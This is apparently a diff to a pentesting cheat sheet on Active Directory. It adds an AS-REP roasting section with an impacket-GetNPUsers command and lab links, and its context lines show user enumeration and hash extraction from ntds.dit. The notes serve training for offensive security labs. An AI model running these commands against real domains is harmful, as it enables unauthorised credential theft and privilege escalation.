@@ -106,6 +106,7 @@ $ python windapsearch.py --dc-ip IP -u "" -U
 #### Pentester — Kerberos access
 
 [![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
 
 * We can use [kerbrute](/cybersecurity/red-team/tools/utilities/windows/kerbrute.md) to enumerate users:
 
@@ -168,6 +169,21 @@ PS> Get-ADDBAccount -All -DatabasePath .\ntds.dit -BootKey $key
 ```
 
 You can use [NtdsAudit](https://github.com/dionach/NtdsAudit) <small>(0.4k ⭐)</small> on Windows or [DPAT](https://github.com/clr2of8/DPAT) <small>(0.9k ⭐, 2022 🪦)</small> Python Script for statistics.
+
+<br>
+
+#### AS-REP Roasting Attack — Privilege Escalation
+
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+[![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
+
+*Alternative name: ASReproasting*
+
+Some kerberos users may have been configured to not require Kerberos Pre Auth, leading to their hash being sent when an authentication request is made before providing valid identification.
+
+```shell!
+$ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junktext -no-pass
+```
 </div><div>
 
 #### Kerberoasting — Privilege Escalation
